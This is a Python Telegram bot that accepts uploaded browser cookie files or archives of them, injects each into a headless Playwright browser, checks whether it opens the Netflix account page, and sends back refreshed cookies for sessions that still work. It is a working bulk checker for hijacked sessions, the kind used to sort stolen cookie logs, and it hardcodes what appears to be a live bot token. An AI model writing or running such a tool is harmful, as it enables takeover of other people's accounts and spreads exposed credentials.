import os
import uuid
import json
import asyncio
import re
import shutil
import logging
import multiprocessing
from concurrent.futures import ProcessPoolExecutor
from functools import partial
from pyunpack import Archive
from telegram import Update, InputFile
from telegram.ext import (
    ApplicationBuilder, MessageHandler, CommandHandler,
    ContextTypes, filters
)
from playwright.async_api import async_playwright

# ========== Configuration ==========
WORKERS = 5  # Change this to adjust worker count
BOT_TOKEN = "8495284623:AAEyQ5XqAD9muGHwtCS05j2znIH5JzglfdQ"
TARGET_URL = "https://www.netflix.com/account"

# ========== Logging ==========
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== Helpers ==========

def normalize_cookie(c):
    out = {
        "name": c["name"],
        "value": c["value"],
        "domain": c.get("domain"),
        "path": c.get("path", "/"),
        "httpOnly": c.get("httpOnly", False),
        "secure": c.get("secure", False),
    }
    if "expires" in c and isinstance(c["expires"], (int, float)):
        out["expires"] = c["expires"]

    ss = c.get("sameSite", "").lower()
    mapping = {
        "lax": "Lax",
        "strict": "Strict",
        "none": "None",
        "no_restriction": "None",
        "unspecified": "Lax",
        "": "Lax"
    }
    out["sameSite"] = mapping.get(ss, "Lax")
    return out

def next_export_filename(base="working", ext=".txt"):
    files = [f for f in os.listdir() if f.startswith(base) and f.endswith(ext)]
    nums = [int(re.search(rf"{base}(\d+){ext}", f).group(1)) for f in files if re.search(rf"{base}(\d+){ext}", f)]
    next_num = max(nums, default=0) + 1
    return f"{base}{next_num}{ext}"

def parse_netscape_cookies(file_path):
    """Parse Netscape cookie format to JSON format"""
    cookies = []
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                # Skip comments and empty lines
                if not line or line.startswith('#'):
                    continue
                
                # Split by tabs
                parts = line.split('\t')
                if len(parts) >= 7:
                    domain = parts[0]
                    domain_specified = parts[1].upper() == 'TRUE'
                    path = parts[2]
                    secure = parts[3].upper() == 'TRUE'
                    expires = int(parts[4]) if parts[4] and parts[4] != '0' else None
                    name = parts[5]
                    value = parts[6]
                    
                    cookie = {
                        "name": name,
                        "value": value,
                        "domain": domain,
                        "path": path,
                        "secure": secure,
                        "httpOnly": False,
                        "sameSite": "lax"
                    }
                    
                    if expires:
                        cookie["expires"] = expires
                    
                    cookies.append(cookie)
                    
    except Exception as e:
        logger.error(f"Failed to parse Netscape cookies: {e}")
        return None
    
    return cookies

# ========== Worker Process Function ==========
def process_cookie_file_worker(input_path):
    """Worker function that runs in separate process"""
    import asyncio
    from playwright.async_api import async_playwright
    
    async def _process():
        logger.info(f"[Worker {os.getpid()}] Processing file: {input_path}")
        
        # Try to detect file format
        try:
            with open(input_path, "r", encoding="utf-8") as f:
                first_line = f.readline().strip()
                f.seek(0)  # Reset file pointer
                
                # Check if it's Netscape format
                if first_line.startswith('#') or '\t' in first_line:
                    logger.info(f"[Worker {os.getpid()}] Detected Netscape cookie format")
                    all_cookies = parse_netscape_cookies(input_path)
                    if not all_cookies:
                        return None
                else:
                    # Try JSON format
                    logger.info(f"[Worker {os.getpid()}] Attempting JSON cookie format")
                    try:
                        data = json.load(f)
                        all_cookies = data if isinstance(data, list) else [data]
                    except json.JSONDecodeError:
                        logger.error(f"[Worker {os.getpid()}] File is neither valid JSON nor Netscape format")
                        return None
                        
        except Exception as e:
            logger.error(f"[Worker {os.getpid()}] Failed to read file: {e}")
            return None

        playwright_cookies = []

        for c in all_cookies:
            try:
                playwright_cookies.append(normalize_cookie(c))
            except Exception as e:
                logger.warning(f"[Worker {os.getpid()}] Skipping malformed cookie: {e}")

        if not playwright_cookies:
            logger.error(f"[Worker {os.getpid()}] No valid cookies to process.")
            return None

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context()

            try:
                await context.add_cookies(playwright_cookies)
            except Exception as e:
                logger.warning(f"[Worker {os.getpid()}] Cookie inject failed: {e}")
                await browser.close()
                return None

            page = await context.new_page()
            logger.info(f"[Worker {os.getpid()}] Navigating to {TARGET_URL}...")
            await page.goto(TARGET_URL, wait_until="load")
            await page.wait_for_load_state("networkidle")

            if page.url.startswith(TARGET_URL):
                logger.info(f"[Worker {os.getpid()}] ✅ Valid session — account page loaded")
                new_cookies = await context.cookies()

                if not new_cookies:
                    logger.error(f"[Worker {os.getpid()}] No cookies returned — not exporting.")
                    await browser.close()
                    return None

                for cookie in new_cookies:
                    if "sameSite" in cookie and isinstance(cookie["sameSite"], str):
                        s = cookie["sameSite"].lower()
                        mapping = {"lax": "lax", "strict": "strict", "none": "no_restriction"}
                        cookie["sameSite"] = mapping.get(s, "lax")

                export_path = next_export_filename()
                with open(export_path, "w", encoding="utf-8") as f:
                    json.dump(new_cookies, f, separators=(",", ":"))
                    logger.info(f"[Worker {os.getpid()}] Exported cookies to {export_path}")

                await browser.close()
                return export_path
            else:
                logger.warning(f"[Worker {os.getpid()}] ❌ Invalid session — redirected to login or another page")
                await browser.close()
                return None
    
    return asyncio.run(_process())

# ========== Process Pool Management ==========
class WorkerPool:
    def __init__(self, max_workers=WORKERS):
        self.max_workers = max_workers
        self.executor = None
        self.active_tasks = 0
    
    def start(self):
        if self.executor is None:
            self.executor = ProcessPoolExecutor(max_workers=self.max_workers)
            logger.info(f"Started worker pool with {self.max_workers} workers")
    
    def stop(self):
        if self.executor:
            self.executor.shutdown(wait=True)
            self.executor = None
            logger.info("Worker pool stopped")
    
    async def process_file(self, file_path):
        if not self.executor:
            self.start()
        
        self.active_tasks += 1
        logger.info(f"Active tasks: {self.active_tasks}/{self.max_workers}")
        
        loop = asyncio.get_event_loop()
        try:
            result = await loop.run_in_executor(
                self.executor,
                process_cookie_file_worker,
                file_path
            )
            return result
        except Exception as e:
            logger.error(f"Worker process failed: {e}")
            return None
        finally:
            self.active_tasks -= 1
            logger.info(f"Task completed. Active tasks: {self.active_tasks}/{self.max_workers}")

# Global worker pool instance
worker_pool = WorkerPool(max_workers=WORKERS)

# Semaphore to control concurrent operations
semaphore = asyncio.Semaphore(WORKERS)

async def process_cookie_file(input_path):
    """Main interface for processing cookie files using worker pool with concurrency control"""
    async with semaphore:
        return await worker_pool.process_file(input_path)

async def send_result(update, exported_path, filename=None):
    if exported_path and os.path.isfile(exported_path):
        file_size = os.path.getsize(exported_path)
        if file_size > 10:
            with open(exported_path, "rb") as f:
                display_name = filename if filename else os.path.basename(exported_path)
                await update.message.reply_document(
                    document=InputFile(f, filename=f"processed_{display_name}")
                )
        else:
            await update.message.reply_text(f"❌ Exported file for {filename or 'file'} is too small or empty.")
        os.remove(exported_path)
        return True
    else:
        await update.message.reply_text(f"❌ Cookie invalid or processing failed for {filename or 'file'}.")
        return False

# ========== Parallel Processing Functions ==========

async def process_files_in_parallel(txt_files, update):
    """Process multiple files in parallel using all available workers"""
    total_files = len(txt_files)
    
    if total_files == 1:
        # Single file - just process it
        full_path, filename = txt_files[0]
        await update.message.reply_text(f"🔄 Processing `{filename}`...")
        exported_path = await process_cookie_file(full_path)
        success = await send_result(update, exported_path, filename)
        return 1 if success else 0
    
    # Multiple files - process in parallel
    await update.message.reply_text(f"🚀 Starting parallel processing of {total_files} files with {WORKERS} workers...")
    
    # Create tasks for all files
    tasks = []
    file_info = []
    
    for full_path, filename in txt_files:
        task = process_cookie_file(full_path)
        tasks.append(task)
        file_info.append((full_path, filename))
    
    # Process all files in parallel
    logger.info(f"Executing {len(tasks)} tasks in parallel...")
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    # Process results
    processed = 0
    failed = 0
    
    for i, (result, (full_path, filename)) in enumerate(zip(results, file_info)):
        if isinstance(result, Exception):
            logger.error(f"Failed to process {filename}: {result}")
            await update.message.reply_text(f"❌ Error processing `{filename}`: {str(result)[:100]}")
            failed += 1
        else:
            exported_path = result
            if exported_path:
                success = await send_result(update, exported_path, filename)
                if success:
                    processed += 1
                    await update.message.reply_text(f"✅ Successfully processed `{filename}`")
                else:
                    failed += 1
            else:
                await update.message.reply_text(f"❌ Invalid cookies in `{filename}`")
                failed += 1
    
    return processed

async def process_files_in_batches(txt_files, update, batch_size=None):
    """Process files in batches for better progress tracking with large archives"""
    if batch_size is None:
        batch_size = WORKERS * 2  # Process 2x workers per batch for better throughput
    
    total_files = len(txt_files)
    processed = 0
    
    # Process files in batches
    for i in range(0, total_files, batch_size):
        batch = txt_files[i:i + batch_size]
        batch_num = i // batch_size + 1
        total_batches = (total_files + batch_size - 1) // batch_size
        
        await update.message.reply_text(
            f"🔄 Processing batch {batch_num}/{total_batches} ({len(batch)} files) with {WORKERS} workers..."
        )
        
        # Process current batch in parallel
        batch_tasks = []
        batch_info = []
        
        for full_path, filename in batch:
            task = process_cookie_file(full_path)
            batch_tasks.append(task)
            batch_info.append((full_path, filename))
        
        # Execute batch in parallel
        batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)
        
        # Handle batch results
        batch_processed = 0
        for result, (full_path, filename) in zip(batch_results, batch_info):
            if isinstance(result, Exception):
                logger.error(f"Failed to process {filename}: {result}")
            elif result:
                success = await send_result(update, result, filename)
                if success:
                    batch_processed += 1
        
        processed += batch_processed
        
        # Progress update
        progress_pct = ((i + len(batch)) / total_files) * 100
        await update.message.reply_text(
            f"📊 Batch {batch_num} complete: {batch_processed}/{len(batch)} successful\n"
            f"📈 Overall progress: {min(i + len(batch), total_files)}/{total_files} ({progress_pct:.1f}%)"
        )
    
    return processed

# ========== Bot Commands ==========

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"👋 Send me a `.txt`, `.zip`, or `.rar` cookie file and I'll process each for you.\n"
        f"🚀 Running with {WORKERS} parallel workers for faster processing!\n"
        f"⚡ Multiple files will be processed simultaneously for maximum speed."
    )

async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"pong 🏓\n⚙️ Workers: {WORKERS}\n🔥 Parallel processing enabled!")

async def workers_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command to show current worker configuration"""
    pool_status = 'Running' if worker_pool.executor else 'Stopped'
    await update.message.reply_text(
        f"⚙️ Worker Configuration:\n"
        f"• Active Workers: {WORKERS}\n"
        f"• Pool Status: {pool_status}\n"
        f"• Active Tasks: {worker_pool.active_tasks}\n"
        f"• Process ID: {os.getpid()}"
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document:
        await update.message.reply_text("❌ Please send a valid file.")
        return

    file_ext = os.path.splitext(document.file_name)[-1].lower()

    if file_ext not in [".txt", ".zip", ".rar"]:
        await update.message.reply_text("❌ Please send a `.txt`, `.zip`, or `.rar` file only.")
        return

    unique_id = uuid.uuid4().hex[:8]
    downloaded_name = f"upload_{unique_id}{file_ext}"
    telegram_file = await document.get_file()
    await telegram_file.download_to_drive(downloaded_name)

    if file_ext == ".txt":
        await update.message.reply_text(f"🔄 Processing your cookie with {WORKERS} workers...")
        exported_path = await process_cookie_file(downloaded_name)
        await send_result(update, exported_path)
        os.remove(downloaded_name)
    else:
        extract_dir = f"extracted_{unique_id}"
        os.makedirs(extract_dir, exist_ok=True)
        try:
            Archive(downloaded_name).extractall(extract_dir)
        except Exception as e:
            await update.message.reply_text(f"❌ Failed to extract archive: {e}")
            shutil.rmtree(extract_dir)
            os.remove(downloaded_name)
            return

        # Collect all .txt files
        txt_files = []
        for root, dirs, files in os.walk(extract_dir):
            for filename in files:
                if filename.endswith(".txt"):
                    txt_files.append((os.path.join(root, filename), filename))
        
        if not txt_files:
            await update.message.reply_text("❌ No valid `.txt` cookie files found in the archive.")
            shutil.rmtree(extract_dir)
            os.remove(downloaded_name)
            return
        
        # Choose processing method based on file count
        if len(txt_files) <= 10:
            # Use parallel processing for smaller batches
            processed = await process_files_in_parallel(txt_files, update)
        else:
            # Use batch processing for large archives
            processed = await process_files_in_batches(txt_files, update)

        if processed == 0:
            await update.message.reply_text("❌ No valid cookie files were processed successfully.")
        else:
            await update.message.reply_text(f"🎉 Successfully processed {processed}/{len(txt_files)} files with {WORKERS} parallel workers!")

        shutil.rmtree(extract_dir)
        os.remove(downloaded_name)

# ========== Application Shutdown Handler ==========
async def shutdown_handler(app):
    """Gracefully shutdown worker pool"""
    logger.info("Shutting down worker pool...")
    worker_pool.stop()

# ========== Run Bot ==========

async def post_init(app):
    await app.bot.delete_webhook(drop_pending_updates=True)
    me = await app.bot.get_me()
    logger.info("✅ Logged in as @%s (%s)", me.username, me.id)
    logger.info(f"🔧 Initialized with {WORKERS} parallel workers")
    
    # Start worker pool
    worker_pool.start()

if __name__ == "__main__":
    # Set multiprocessing start method for compatibility
    multiprocessing.set_start_method('spawn', force=True)
    
    app = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("ping", ping))
    app.add_handler(CommandHandler("workers", workers_info))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    try:
        print(f"🤖 Bot is running with {WORKERS} parallel workers...")
        app.run_polling(drop_pending_updates=True)
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    finally:
        # Cleanup worker pool
        worker_pool.stop()

